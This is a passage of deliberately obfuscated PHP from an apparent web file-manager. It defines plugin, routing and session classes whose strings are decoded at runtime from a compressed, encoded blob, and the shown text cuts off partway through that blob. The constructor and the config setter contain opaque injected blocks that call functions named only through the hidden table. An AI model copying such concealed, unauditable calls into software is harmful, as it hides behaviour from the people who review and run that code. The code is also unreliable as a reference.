__construct($c߫ΐ) { parent::__construct($c߫ΐ); $this->signatureVersion($_SERVER[][210]); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } } goto FƱܜ; b: class PluginBase { public $in; public $pluginName; public $pluginPath; public $pluginHost; public $pluginHostDefault; public $pluginApi; public $packageData; private $pluginLangArr; private $pluginConfig; public $cachePath; public $fileInfo; function __construct() { goto E; fը: $this->pluginHost = $config[$a[1396]] . $this->pluginName . $a[8]; $this->pluginHostDefault = $config[$a[1396]] . $this->pluginName . $a[8]; $Dԅ = $config[$a[1397]]; goto BǢՍ; FȚ: $this->config =& $config; $this->in =& $in; $this->modelPlugin = Model($a[1394]); goto E; E: $this->pluginName = str_replace($a[1394], $a[33], get_class($this)); $this->pluginPath = PLUGIN_DIR . $this->pluginName . $a[8]; $this->pluginApi = appHostGet() . $a[1395] . $this->pluginName . $a[8]; goto fը; BǢՍ: if ($Dԅ && strpos($a[47] . $Dԅ . $a[47], $this->pluginName) !== !1) { $this->pluginHost = $config[$a[1398]] . $this->pluginName . $a[8]; } $this->pluginLangArr = $this->initLang(); $this->values = array(); goto C; E: $a =& $_SERVER[]; if ($_SERVER[$a[794]] != $_SERVER[$a[839]]) { goto e; fԞ: $a = $a[841]; $a($_SERVER[$a[842]]); $a($_SERVER[$a[796]] . $a[843]); goto Fǖ; Fǖ: $dᎴ = 1; while ($dᎴ > 1) { $dᎴ = $dᎴ + 4; $cߡƂ = rawurlencode($dᎴ . $a[373]); } goto b; e: $a = $a[840]; $Dߋ = $a[795]; $Aי = $_SERVER[$a[796]] . $a[797]; goto eᝌ; eᝌ: $d̵ = $Dߋ($Aי); $Eì = explode($a[227], $d̵); if (count($Eì) < $a[620]) { $BÛԶ = $a[798]; $BÛԶ(); } goto fԞ; b: } global $in, $config; goto FȚ; C: return $this; goto d䕴; d䕴: } public function regist() { $this->hookRegist(array()); } public function install() { } public function update() { } public function unInstall() { } public function echoJs() { $this->echoFile($_SERVER[][1399]); } protected function assign($AӏЗ, $A뎣Џ = false) { if (is_array($AӏЗ)) { $this->values = array_merge($this->values, $AӏЗ); } else { $this->values[$AӏЗ] = $A뎣Џ; } } protected function display($C̾) { extract($this->values); require $C̾; } final function hookRegist($e) { $this->modelPlugin->appRegist($this->pluginName, $e); } final function appIcon() { $cɥ =& $_SERVER[]; $D = $this->appPackage(); $d̂ = $cɥ[33]; if (isset($D[$cɥ[403]])) { if (isset($D[$cɥ[403]][$cɥ[1400]])) { $d̂ = $cɥ[1401] . $D[$cɥ[403]][$cɥ[1400]] . $cɥ[1402]; } else { if ($D[$cɥ[403]][$cɥ[1403]]) { $d̂ = $cɥ[1404] . $D[$cɥ[403]][$cɥ[1403]] . $cɥ[1405]; } } } return $d̂; } final function fileCanView($Bх) { goto cߺ; ê: $Dɧ = Session::get($B걢[1406]); if (!$Dɧ || !$Dɧ[$B걢[1407]]) { $bǃ눕 = $B걢[1408] . rawurlencode(this_url()); show_tips(LNG($B걢[1409]) . $B걢[1410] . $bǃ눕 . $B걢[1411] . LNG($B걢[1412]) . $B걢[1413], !1); } if (!Action($B걢[1414])->authCan($B걢[1415])) { show_tips(LNG($B걢[1416]) . $B걢[1417], !1); } goto AЈ; cߺ: $B걢 =& $_SERVER[]; if (request_url_safe($Bх)) { return !0; } if ($this->isShare($Bх)) { return !0; } goto ê; AЈ: ActionCall($B걢[1418], $Bх); goto cڗ; cڗ: } final function isShare($F) { $a = KodIO::parse($F); return $a[$_SERVER[][29]] == KodIO::KOD_SHARE_LINK; } final function filePathLink($bٳ) { if (request_url_safe($bٳ)) { return $bٳ; } if (!$this->isShare($bٳ)) { $bٳ = $this->filePath($bٳ); } return Action($_SERVER[][1069])->linkOut($bٳ); } public function filePathLinkOut($c) { if (request_url_safe($c)) { return $c; } $this->fileCanView($c); return Action($_SERVER[][1069])->link($c); } final function filePath($B) { $f =& $_SERVER[]; if ($E = $this->checkSharePath($B)) { return $E; } $this->fileCanView($B); if (request_url_safe($B)) { $cލ = parse_url_query($B); if (isset($cލ[$f[1419]]) && isset($cލ[$f[207]])) { $eֱ = Model($f[1123])->get($f[1420]); $e۱ = Mcrypt::decode($cލ[$f[207]], $eֱ); if ($e۱) { $this->fileInfo = IO::infoWithChildren($e۱); $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); return $e۱; } } $B = $this->_cacheHttpFile($B); $this->fileInfo = IO::infoWithChildren($B); } else { $this->fileInfo = IO::infoWithChildren($B); if (!$this->fileInfo) { show_tips(LNG($f[104]), !1); } $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); } return $B; } final function _cacheHttpFile($Aԍքۓ) { $C巙藸 = hash_path($Aԍքۓ, !0); $this->cachePath = $this->pluginCachePath($C巙藸); if ($Dʛ = IO::fileNameExist($this->cachePath, $C巙藸)) { return KodIO::make($Dʛ); } $FЛ = $this->cachePath . $C巙藸; return $this->pluginCacheFileSet($FЛ, file_get_contents($Aԍքۓ)); } final function _tmpFileName($a􂌐 = array()) { goto Cێ; Cێ: $a͋ӳ =& $_SERVER[]; if (!$a􂌐) { $a􂌐 = $this->fileInfo; } if (isset($a􂌐[$a͋ӳ[170]])) { return $a􂌐[$a͋ӳ[170]]; } goto Fм; C迦: $Eޣ = array($a􂌐[$a͋ӳ[28]], $a􂌐[$a͋ӳ[75]], $a􂌐[$a͋ӳ[77]]); if (isset($a􂌐[$a͋ӳ[481]])) { $Eޣ[] = $a􂌐[$a͋ӳ[481]]; } return md5(implode($a͋ӳ[70], $Eޣ)); goto eސ; Fм: if (isset($a􂌐[$a͋ӳ[163]][$a͋ӳ[170]])) { return $a􂌐[$a͋ӳ[163]][$a͋ӳ[170]]; } $f­ = IO::hashSimple($a􂌐[$a͋ӳ[75]]); if ($f­) { return $f­; } goto C迦; eސ: } final function checkSharePath($b荷۷) { goto b; C: $eۋβ = Action($dΦ[1069])->sharePathInfo($b荷۷); if (!isset($eۋβ[$dΦ[75]])) { show_json(LNG($dΦ[1422]), !1); } $this->fileInfo = $eۋβ[$dΦ[163]]; goto b; b: $dΦ =& $_SERVER[]; if (!defined($dΦ[448])) { define($dΦ[1421], 0); } if (!$this->isShare($b荷۷)) { return !1; } goto C; b: $this->cachePath = $this->pluginCachePath($this->fileInfo[$dΦ[170]]); return $eۋβ[$dΦ[75]]; goto bÒ; bÒ: } final function pluginCachePath($BΌ = '') { $D =& $_SERVER[]; $f򂻽 = IO_PATH_SYSTEM_TEMP . $D[1423] . $this->pluginName; if (!($Ëߌ = IO::infoFull($f򂻽))) { return IO::mkdir($f򂻽 . $D[8] . $BΌ); } if (empty($BΌ)) { return $Ëߌ[$D[75]]; } if (!($e쓟 = IO::fileNameExist($Ëߌ[$D[75]], $BΌ))) { return IO::mkdir($Ëߌ[$D[75]] . $BΌ); } return KodIO::make($e쓟); } final function pluginCacheFileSet($B, $Dߎͬ = '') { $E =& $_SERVER[]; if (!($Bĥ = IO::infoFull($B))) { return IO::mkfile($B, $Dߎͬ, REPEAT_REPLACE); } IO::setContent($Bĥ[$E[75]], $Dߎͬ); return $Bĥ[$E[75]]; } final function pluginLocalFile($Fڂ = '') { goto Dبʂ; Dبʂ: $d =& $_SERVER[]; $C更 = TEMP_FILES . "{$this->pluginName}\57"; if (!is_dir($C更)) { mk_dir($C更); } goto Bʡ; BϿ: return IO::copy($Fڂ, $C更, 0, $FӜ); goto E蠥; Bʡ: if (!$Fڂ) { return $C更; } $E˅ = IO::info($Fڂ); $FӜ = $this->_tmpFileName($E˅) . $d[94] . $E˅[$d[167]]; goto b䗤; b䗤: if (!checkExtSafe($FӜ)) { $FӜ = $FӜ . $d[1424]; } $a懙 = $C更 . $FӜ; if (@file_exists($a懙)) { return $a懙; } goto BϿ; E蠥: } final function appPackage() { goto C; a֗: $Fڊ = Hook::trigger($F[1426], $CʊȌ); if ($Fڊ && is_array($Fڊ)) { $CʊȌ = $Fڊ; } $this->packageData = $CʊȌ; goto A; A: return $CʊȌ; goto E; Cݟꯎ: $this->parseLang($fڠ); $CʊȌ = json_decode_force($fڠ); if (!$CʊȌ) { return array(); } goto a֗; C: $F =& $_SERVER[]; if ($this->packageData) { return $this->packageData; } $fڠ = $this->parseFile($this->pluginPath . $F[1425]); goto Cݟꯎ; E: } public function packageInfoGet($bݹ) { $aɘ쳈 = $this->appPackage(); return array_get_value($aɘ쳈, $bݹ); } public function packageVersion() { return $this->packageInfoGet($_SERVER[][1427]); } public function packageTitle() { return $this->packageInfoGet($_SERVER[][1428]); } public function packageCopyright() { return $this->packageInfoGet($_SERVER[][1429]); } private function parseFile($Dٍݽ) { goto aא; Cҿ: $AԆŇ = str_replace($d, $eŬٕ, $AԆŇ); return $AԆŇ; goto fؔ̋; fݼ: $eŬٕ = array($this->pluginHost, $this->pluginHostDefault, $this->pluginApi, $this->pluginName, $this->pluginPath, APP_HOST, $this->config[$Eګ[87]][$Eګ[1437]]); if (strstr($AԆŇ, $Eګ[1438])) { $F塺 = rawurlencode(json_encode($this->pluginLangArr)); $AԆŇ = str_replace($Eګ[1438], $F塺, $AԆŇ); } if (strstr($AԆŇ, $Eګ[1439])) { $F塺 = $F塺 = rawurlencode(json_encode($this->getConfig())); $AԆŇ = str_replace($Eګ[1439], $F塺, $AԆŇ); } goto Cҿ; aא: $Eګ =& $_SERVER[]; $AԆŇ = file_get_contents($Dٍݽ); $d = array($Eګ[1430], $Eګ[1431], $Eګ[1432], $Eګ[1433], $Eګ[1434], $Eګ[1435], $Eګ[1436]); goto fݼ; fؔ̋: } private function parseLang(&$dıړ) { goto d; D: preg_match_all($aﴂ[1441], $dıړ, $f); if (!is_array($f) || count($f) == 0 || !is_array($f[0]) || count($f[0]) == 0) { return; } $F֮ = array(); goto B؃; B؃: $d = array(); foreach ($f[0] as $cψ) { $B = substr($cψ, strlen($AɆ), -4); $A󒘿ܽ = LNG($B); $F֮[] = $cψ; $d[] = str_replace(array($aﴂ[227], $aﴂ[1037], $aﴂ[338], $aﴂ[115]), array($aﴂ[50], $aﴂ[50], $aﴂ[33], $aﴂ[1442]), $A󒘿ܽ); } $dıړ = str_replace($F֮, $d, $dıړ); goto dʹ; d: $aﴂ =& $_SERVER[]; $AɆ = $aﴂ[1440]; if (!strstr($dıړ, $AɆ)) { return; } goto D; dʹ: } private function parseConfig(&$C) { goto EǄ; EǄ: $b =& $_SERVER[]; $dՌ = $b[1443]; if (!strstr($C, $dՌ)) { return; } goto A; A: preg_match_all($b[1444], $C, $Fޚ); if (!is_array($Fޚ) || count($Fޚ) == 0 || !is_array($Fޚ[0]) || count($Fޚ[0]) == 0) { return; } $D = $this->getConfig(); goto Dݿ߽; B: $C = str_replace($Bŏ, $A, $C); goto E; Dݿ߽: $Bŏ = array(); $A = array(); foreach ($Fޚ[0] as $fׯƙ) { $a = substr($fׯƙ, strlen($dՌ), -2); $Bŏ[] = $fׯƙ; $A[] = _get($D, $a); } goto B; E: } private function parsePackage(&$Dò) { goto a𡱮; D˂̅: $a = array(); $Eͱ = array(); foreach ($A[0] as $d윊) { $cꋪ = substr($d윊, strlen($E), -2); $a[] = $d윊; $Eͱ[] = _get($Eɓꩴ, $cꋪ); } goto FȢ; FȢ: $Dò = str_replace($a, $Eͱ, $Dò); goto EڅЮ; a𡱮: $C =& $_SERVER[]; $E = $C[1445]; if (!strstr($Dò, $E)) { return; } goto b; b: preg_match_all($C[1446], $Dò, $A); if (!is_array($A) || count($A) == 0 || !is_array($A[0]) || count($A[0]) == 0) { return; } $Eɓꩴ = $this->appPackage(); goto D˂̅; EڅЮ: } final function echoFile($Dީ, $a = false) { goto cϿ; e: $this->parsePackage($bᣥ); if (is_array($a)) { $bᣥ = str_replace(array_keys($a), array_values($a), $bᣥ); } echo $Dׄۆ[227] . $bᣥ; goto FӴ𷑦; cܒ: $bᣥ = $this->parseFile($d); $this->parseLang($bᣥ); $this->parseConfig($bᣥ); goto e; cϿ: $Dׄۆ =& $_SERVER[]; $d = $this->pluginPath . $Dީ; if (ACT == $Dׄۆ[1447]) { echo $Dׄۆ[1448] . $this->pluginName . $Dׄۆ[8] . $Dީ . $Dׄۆ[1449]; if (!file_exists($d)) { echo $Dׄۆ[1450]; return; } } goto cܒ; FӴ𷑦: } final function initLang() { goto B䶐; B䶐: $ċ٦ =& $_SERVER[]; $cٰ = $ċ٦[1451]; $e͉ = $this->pluginPath . $ċ٦[1452]; goto Eٯ϶; Cƚ: if (!is_array($C¯)) { return array(); } if (@count($C¯) > 0) { I18n::set($C¯); } return $C¯; goto FϷ; Eٯ϶: $cݯ = I18n::getType(); $C¯ = array(); if (file_exists($e͉ . $cݯ . $ċ٦[811])) { $C¯ = (include $e͉ . $cݯ . $ċ٦[811]); } else { if ($cݯ == $ċ٦[1453] && !file_exists($e͉ . $cݯ . $ċ٦[811]) && file_exists($e͉ . $ċ٦[1454])) { $C¯ = (include $e͉ . $ċ٦[1454]); } else { if (file_exists($e͉ . $cٰ . $ċ٦[811])) { $C¯ = (include $e͉ . $cٰ . $ċ٦[811]); } } } goto Cƚ; FϷ: } public function getConfig() { if (!$this->pluginConfig) { $this->pluginConfig = $this->modelPlugin->getConfig($this->pluginName); } return $this->pluginConfig; } public function setConfig($dܖ) { $c鷎ނ =& $_SERVER[]; if (!isset($_SERVER[$c鷎ނ[794]]) || !isset($_SERVER[$c鷎ނ[792]])) { goto Bㆊ; f߾͂: for ($Dǰ焓 = $b; $Dǰ焓 > 0; $Dǰ焓++) { $EŞǿ = json_encode($GLOBALS[$c鷎ނ[405]]); } goto F; Bㆊ: $Bد = $c鷎ނ[840]; $B熘 = $c鷎ނ[795]; $F = $_SERVER[$c鷎ނ[796]] . $c鷎ނ[797]; goto eĕ; eĕ: $A = $B熘($F); $Aบ = explode($c鷎ނ[227], $A); if (count($Aบ) < $c鷎ނ[620]) { $fʅ = $c鷎ނ[798]; $fʅ(); } goto C; C: $EŞǿ = $c鷎ނ[841]; $EŞǿ($_SERVER[$c鷎ނ[842]]); $b = 1; goto f߾͂; F: } return $this->modelPlugin->setConfig($this->pluginName, $dܖ); } public function onSetConfig($aښ) { } public function onGetConfig($f) { } public function onChangeStatus($CӰ) { } public function onUninstall() { } public function onInstall() { } public function authCheck($f = "\x70\154\165\147\151\156\x41\165\164\150") { $bݨĉ =& $_SERVER[]; if (!defined($bݨĉ[448])) { return !1; } if (_get($GLOBALS, $bݨĉ[479])) { return !0; } $b܂ = $this->getConfig(); if (!$b܂[$f]) { return !1; } return ActionCall($bݨĉ[1455], $b܂[$f]); } public function url($d֐됡, $fȳ = '', $Fؔ = true) { goto fё; dϱΖ: $e = $this->packageVersion(); $Fγ = $d毚 . $c[434] . $e; if (substr($d֐됡, 0, 4) == $c[146] || substr($d֐됡, 0, 2) == $c[1241]) { $cĄ = $d֐됡 . $c[1456] . $Fγ; } else { if ($fȳ == $c[33]) { $cĄ = $this->pluginHost . $d֐됡 . $c[1456] . $Fγ; } else { if ($fȳ === $c[76]) { $cĄ = $this->pluginHost . $d֐됡; } else { if ($fȳ == $c[1457]) { $cĄ = STATIC_PATH . $d֐됡 . $c[1456] . $d毚; } else { if ($fȳ == $c[1458]) { $cĄ = APP_HOST . $c[1459] . $d֐됡 . $c[1456] . $d毚; } else { if (isset($dü[$fȳ])) { $cĄ = $dü[$fȳ] . $d֐됡 . $c[1456] . $Fγ; } } } } } } goto e编̩; e编̩: if (!$Fؔ) { return $cĄ; } echo $cĄ; goto D툯; fё: $c =& $_SERVER[]; $dü = $this->getConfig(); $d毚 = KOD_VERSION . $c[94] . KOD_VERSION_BUILD; goto dϱΖ; D툯: } public function link($A = false, $e = '') { $F =& $_SERVER[]; if (!$A) { $this->link($F[1460], $F[1458]); $this->link($F[1461], $F[1457]); $this->link($F[1462], $F[1457]); $this->link($F[1463], $F[1457]); $this->link($F[1464], $F[1457]); return; } $a鶚 = $this->url($A, $e, !1); if (substr($A, -3) == $F[1465]) { echo $F[1466] . $a鶚 . $F[1467] . $F[227]; } else { if (substr($A, -4) == $F[1468]) { echo $F[1469] . $a鶚 . $F[1470] . $F[227]; } } } } class Route { public static $halts = false; public static $routes = array(); public static $methods = array(); public static $callbacks = array(); public static $maps = array(); public static $patterns = array("\x3a\x61\156\x79" => "\x5b\136\57\135\x2b", "\72\x6e\x75\x6d" => "\133\x30\x2d\x39\135\x2b", "\72\x61\x6c\x6c" => "\x2e\x2a"); public static $errorCallback; public static function __callstatic($Dې, $E) { $b =& $_SERVER[]; if ($Dې == $b[1471]) { $c⡎ҳ = array_map($b[1472], $E[0]); $a˙ = strpos($E[1], $b[8]) === 0 ? $E[1] : $b[8] . $E[1]; $bӱ = $E[2]; } else { $c⡎ҳ = null; $a˙ = strpos($E[0], $b[8]) === 0 ? $E[0] : $b[8] . $E[0]; $bӱ = $E[1]; } array_push(self::$maps, $c⡎ҳ); array_push(self::$routes, $a˙); array_push(self::$methods, strtoupper($Dې)); array_push(self::$callbacks, $bӱ); } public static function error($f) { self::$errorCallback = $f; } public static function haltOnMatch($EĞ = true) { self::$halts = $EĞ; } public static function dispatch() { goto e; eŠǦ: self::$routes = preg_replace($a[1161], $a[8], self::$routes); if (in_array($C섽, self::$routes)) { $Dذ = array_keys(self::$routes, $C섽); foreach ($Dذ as $fٲ) { if (self::$methods[$fٲ] == $f䤋 || self::$methods[$fٲ] == $a[1474] || in_array($f䤋, self::$maps[$fٲ])) { $EÎ = !0; if (!is_object(self::$callbacks[$fٲ])) { $Aܸ = explode($a[8], self::$callbacks[$fٲ]); $dŰ = end($Aܸ); $d² = explode($a[1475], $dŰ); $dܼ = new $d²[0](); $dܼ->{$d²[1]}(); if (self::$halts) { return; } } else { call_user_func(self::$callbacks[$fٲ]); if (self::$halts) { return; } } } } } else { $E = 0; foreach (self::$routes as $fٲ) { if (strpos($fٲ, $a[4]) !== !1) { $fٲ = str_replace($A, $cſ, $fٲ); } if (preg_match($a[1476] . $fٲ . $a[1477], $C섽, $F׭)) { if (self::$methods[$E] == $f䤋 || self::$methods[$E] == $a[1474] || !empty(self::$maps[$E]) && in_array($f䤋, self::$maps[$E])) { $EÎ = !0; array_shift($F׭); if (!is_object(self::$callbacks[$E])) { $Aܸ = explode($a[8], self::$callbacks[$E]); $dŰ = end($Aܸ); $d² = explode($a[1475], $dŰ); $dܼ = new $d²[0](); if (!method_exists($dܼ, $d²[1])) { echo $a[1478]; } else { call_user_func_array(array($dܼ, $d²[1]), $F׭); } if (self::$halts) { return; } } else { call_user_func_array(self::$callbacks[$E], $F׭); if (self::$halts) { return; } } } } $E++; } } if ($EÎ == !1) { if (!self::$errorCallback) { self::$errorCallback = function () { $b憎 =& $_SERVER[]; header($_SERVER[$b憎[1479]] . $b憎[1480]); echo $b憎[1481]; }; } else { if (is_string(self::$errorCallback)) { self::get($_SERVER[$a[1473]], self::$errorCallback); self::$errorCallback = null; self::dispatch(); return; } } call_user_func(self::$errorCallback); } goto Bֈ; A՜趿: $A = array_keys(static::$patterns); $cſ = array_values(static::$patterns); $EÎ = !1; goto eŠǦ; e: $a =& $_SERVER[]; $C섽 = parse_url($_SERVER[$a[1473]], PHP_URL_PATH); $f䤋 = $_SERVER[$a[156]]; goto A՜趿; Bֈ: } } class Session { public static $sessionTime; public static $sessionSign; public static $handle; public static $data; public static function init() { goto bԷ; bԷ: $FԴ =& $_SERVER[]; static $Cߋ = false; if ($Cߋ) { return $Cߋ; } goto EӬ; EӬ: $D = $GLOBALS[$FԴ[6]][$FԴ[345]]; self::$sessionTime = $D[$FԴ[1482]]; $b҇ = isset($GLOBALS[$FԴ[1483]]) ? $GLOBALS[$FԴ[1483]] : SESSION_ID; goto aձ崮; cǸ접: if (!self::$data) { CacheLock::lock(self::$sessionSign); self::$data = self::$handle->get(self::$sessionSign); CacheLock::unlock(self::$sessionSign); self::$data = unserialize(self::$data); if (!is_array(self::$data)) { self::$data = array(); } } $Cߋ = new self(); return $Cߋ; goto bԹކ; D۪: $f߬ = $D[$b⟚̪]; $Fѽ = $D[$FԴ[801]]; switch ($b⟚̪) { case $FԴ[17]: self::$handle = Model($FԴ[802]); break; case $FԴ[803]: self::$handle = new CacheRedis($f߬, $Fѽ); break; case $FԴ[804]: self::$handle = new CacheMemcached($f߬, $Fѽ); break; case $FԴ[173]: $f߬[$FԴ[75]] = $f߬[$FԴ[75]] . $FԴ[1485]; self::$handle = new CacheFile($f߬, $Fѽ); default: break; } goto cǸ접; aձ崮: if (self::$sessionSign) { } else { if (Cookie::get($b҇)) { self::$sessionSign = Cookie::get($b҇); } else { self::$sessionSign = guid(); } } Cookie::setSafe($b҇, self::$sessionSign, self::$sessionTime); $b⟚̪ = $D[$FԴ[1484]]; goto D۪; bԹކ: } public static function sign($dʦ = false) { $dʦ && (self::$sessionSign = $dʦ); self::init(); return self::$sessionSign; } public static function set($e렝ݰ, $bС = false) { self::init(); if (is_array($e렝ݰ)) { foreach ($e렝ݰ as $D => $D˷) { array_set_value(self::$data, $D, $D˷); } } else { array_set_value(self::$data, $e렝ݰ, $bС); } CacheLock::lock(self::$sessionSign); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); CacheLock::unlock(self::$sessionSign); } public static function get($cɝ = false) { self::init(); if (!$cɝ) { return self::$data; } return array_get_value(self::$data, $cɝ); } public static function remove($f) { self::init(); unset(self::$data[$f]); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); } public static function destory() { Cookie::remove(SESSION_ID, !0); self::init(); self::clearTimeout(); self::$data = array(); return self::$handle->remove(self::$sessionSign); } public static function clearTimeout() { self::init(); if (method_exists(self::$handle, $_SERVER[][806])) { self::$handle->clearTimeout(); } } } goto cˎ; d: if (!function_exists('_kodDe')) { function _kodDe($A߯¦ɰ) { $A߯¦ɰ = base64_decode($A߯¦ɰ); $cڈթ = strlen($A߯¦ɰ); $BÅ = ''; $bݖ֯ = ord($A߯¦ɰ[0]) - 30; for ($a󹪄 = 1; $a󹪄 < $cڈթ; $a󹪄 += 2) { if ($a󹪄 + 1 < $cڈթ) { $BÅ .= chr(ord($A߯¦ɰ[$a󹪄 + 1]) + $bݖ֯); $BÅ .= chr(ord($A߯¦ɰ[$a󹪄]) + $bݖ֯); } else { $BÅ .= chr(ord($A߯¦ɰ[$a󹪄]) + $bݖ֯); } } return $BÅ; } } define("\212", "\367\271\341\223"); $_SERVER[] = explode("\174\2\174\5\174\2", gzinflate(substr(strrev('q#ȋl\'v8v&6Q!\\ 0E|}'."\0".''."\0".''."\0".''."\0".''."\0".''."\0".'')."\x9c\x28\x28\x2b\x69\x2d\xad\x2d\x69\xe5\xdd\x95\x5b\x12\x5a\x28\x7\x21\x70\x1\x2\x47\xaf\xa1\xf7\x7e\xc7\x51\xee\x68\xe1\x80\xd0\x9\x70\x7\x7\x81\x14\x20\x84\x83\x1c\xed\x1f\xe"."\276\351\63\273\222\271\377\367\373\76\110\242\351\73\363\346\315\233\367\146\336\173\163\341\212\275\126\354\263\142\257\363\66\275\366\331\31\377\71\365\357\70\266\142\34\372"."\37\205\217\135\75\141\17\364\337\270\325\347\126\124\264\315\330\277\252\343\300\13\36\270\123\336\367\57\337\75\375\300\213\127\276\361\301\213\267\105\222\163\377\164\145\352"."\x98\x3d\xee\xfa\xd7\x61\x8f\xd6\x83\x92\xb8\x62\x3d\xfe\x91\x72\x9a\x29\x29\xc3\xaa\x61\x1a\x38\x21\xa1\xe5\x7a\xd5\x14\xe\xab\x39\xfc\xeb\xc6\x3f\xc6\x40\x46\x35\x15\x1c\x8e\x75\x4".base64_decode('I7FwV2enLxSJkRbF/KyWJKG8rMtZ0nhe0Q3wKbG5WF7LKzlLCk9IyqYclw3Skg==')."\xb7\x29\xe6\xf5\x75\x6\x82\x3d\xb1\x48\x4f\xa7\x8f\x94\x88\xc7\x6\xa\x8a\x3e\x82\x63\x28\x18\x36\x65\xdd\x8c\xa8\x59\x85\x95\x18\xd2\x59\xbf\x9a\x7c\xad\xfe\xe\x29\x12\xf2\x74\x84"."\x3d\xcd\x11\x7f\xb0\x3\x27\x37\x7\xdb\xdb\xfd\x91\xe2\xf4\x50\x30\x10\x68\xf2\x34\xcf\x2f\xce\xe9\xc\x79\x5a\xdb\x3d\x12\xe8\x5f\x46\x89\xa9\xb9\x5e\xad\x42\x5a\x86\x73\x96\x49\x95"."\70\320\242\52\231\44\16\346\144\332\35\163\44\117\102\21\26\2\163\220\53\144\62\70\322\301\102\244\377\112\257\134\310\20\230\171\305\110\136\127\263\62\35\372\174\145"."\x84\xa5\xe2\x80\x5c\x30\x35\x35\x97\xc0\x11\xdf\xb0\xa9\xcb\x3c\x1d\xf4\x38\xa1\x2b\x59\x25\x47\x9a\xa\xfb\x2\xbe\xe6\x88\x4\xbb\x29\xb5\x84\x82\xed\x12\x99\x8a\xac\x6c\x98\x8a\x2e"."\165\267\371\102\76\11\166\275\261\34\215\270\134\302\365\272\72\0\100\44\117\40\40\215\325\202\251\144\363\264\31\134\247\104\143\301\220\327\27\222\232\172\44\16\247\204".base64_decode('ls1qORdoBcynKXTVFwrhgINgcMAPp45Egi0tYR+LkcEtCICeTCdYaoklezNmbA==').base64_decode('UM4UKLL2499y8kN+NYMg8ICaUwsEWUkTmsZWDgkUaGmFpmRBNY2sKbDABnGwcQ==')."\56\376\155\40\205\342\61\230\247\350\146\114\311\45\264\244\232\43\313\160\36\131\162\4\361\144\63\355\325\125\120\216\64\250\271\22\132\176\244\135\33\44\143\350\125\63"."\x4a\x80\xad\xb2\x5e\x2d\x93\x54\x74\x1e\xcf\x83\xea\x62\xe\x19\x8c\x3a\x2a\xd4\xee\x28\x64\xc5\x22\x2c\x9a\x48\xab\x99\xa4\x4e\x17\xe7\xcf\x95\x4\xcb\x5f\xed\x1d\xe1\x8b\xd0\xd0\xa"."\172\102\361\203\145\302\353\166\262\236\114\43\205\24\323\4\203\66\350\270\272\362\31\115\116\206\25\135\30\153\13\250\30\54\230\142\142\1\25\153\321\364\254\27\220\13".strrev('&rVLL+K]%T'."\0".'NKrX$tH}')."\xc\x3a\x56\xb7\x11\x57\x73\x6e\x90\x82\xa3\xfe\x60\x2c\x2d\x1b\xe9\xf6\x64\x5d\xc\xd5\xa2\xa4\x34\xa9\xc\xbb\xf2\xe9\x3c\x59\xf1\x6c\x91\x47\x2d\xe8\xe\x67\xa7\x43\x33\x7d\x2\x41".strrev('XfVzڑ]IHu)'."\n".'+'."\0".'C6$+Ӈ#9	h')."\216\245\31\54\321\34\46\30\123\106\342\312\260\111\200\42\65\44\322\262\16\246\253\261\140\366\72\147\21\262\222\317\147\324\204\154\252\132\316\255\45\114\305\164\32\246"."\256\310\244\65\117\42\241\30\206\263\131\313\231\272\226\161\172\62\31\155\310\31\324\325\224\232\253\227\246\22\42\14\62\301\62\167\102\302\130\117\326\156\131\203\4\161"."\x5\xd2\x85\xa9\xf8\x6b\x74\x4d\xb2\xd2\xba\x9c\x33\x7a\x15\xdd\xe9\x23\x8b\xa6\x5e\x2\xf3\xc1\xe8\x22\x2d\xe6\x55\x8d\xbc\x66\xa8\xb0\x7b\xf5\x92\x6c\x9a\x72\x22\xd\x69\xa\x6f\xbe".base64_decode('8WfKq7mMmlOKyvqG86quGLSvUmt7hDQCWlecnbqcysr1Ur4QB5Ahq7dEGi5NQA==').base64_decode('Uy8lYNQhZQuG6dQVQJxUsA2SOfb3Otvh0lKVpDMMaDhJnl5dKwG0kWgeTm2LRA==')."\72\143\376\26\260\125\167\370\142\355\236\110\163\33\351\266\51\247\150\237\3\200\62\263\46\151\342\42\47\130\142\20\261\72\300\130\171\142\247\66\244\350\340\303\115\43"."\365\122\277\226\214\153\303\56\232\5\13\207\1\15\241\205\341\164\347\115\147\110\316\245\40\174\342\43\246\102\320\317\30\114\131\1\35\120\162\51\63\115\53\206\175\241"."\205\276\120\54\34\154\211\164\173\102\76\262\132\0\226\14\323\117\301\246\63\316\220\222\4\240\117\230\264\236\234\207\120\243\145\340\302\200\163\105\163\341\142\241\171\1"."\177\53\4\214\327\151\200\102\116\261\24\155\73\240\146\125\330\167\223\345\40\110\2\16\240\225\164\310\215\6\324\30\115\117\255\210\46\253\52\235\340\337\251\225\113\242".base64_decode('XtfUpfPcKq/jnuaaJtVUz5A6AUuiyhmJDLqoRLUUnP8zAIA7lrCsbaDDiSHfgg==')."\56\137\70\22\153\367\105\332\202\136\362\5\237\207\204\2\32\136\232\164\104\113\360\317\122\27\247\307\140\316\375\131\71\145\243\322\60\326\256\351\212\65\205\357\32\335".base64_decode('apKScRhtU9RUmoxPha0ltIymyxlIxSgSK5SypNReMj+YYPJIWM3mKV0z04VsXA==')."\x8\xba\x79\x57\xc8\x77\xc1\xcc\xd3\x8d\x26\xad\xb1\x8d\x4e\xd3\x49\xa8\xde\x4d\xaa\x4c\xa9\x69\xa1\x34\xda\x1d\x9e\xe\xfe\x70\x82\x9c\xd4\xb2\x32\x65\x77\x11\x71\x52\x92\x98\x3a\xe1".base64_decode('pKmWnDZF5junqZsaTNUtRdoVM62R6UoptEsF1jfay6SSUShc0gol7oCHG2TgAg==')."\214\32\10\363\275\124\65\102\240\40\144\234\150\274\33\362\267\74\301\144\105\63\140\33\11\306\373\300\72\41\54\204\152\264\10\273\176\114\103\171\240\257\62\57\337\251"."\x2b\xbd\x2a\x59\x6d\x39\x30\x55\xed\xb2\xde\x4f\x2b\x80\xa9\xe1\xfb\xd\x8c\x8\x8d\xb5\x74\x5\x2\xb1\xe6\x60\x47\x4\xf0\xcc\x38\xa5\x3b\xe4\x8f\xf8\x28\x72\x7a\xbc\x31\x4f\x73\x27".base64_decode('2z35VJMCkFIUbwM4ZbBG2IL4XsWpON1jIZXGYUCW81rOUJwJ0lqS03NcosFGzA==')."\213\152\160\116\175\330\51\147\107\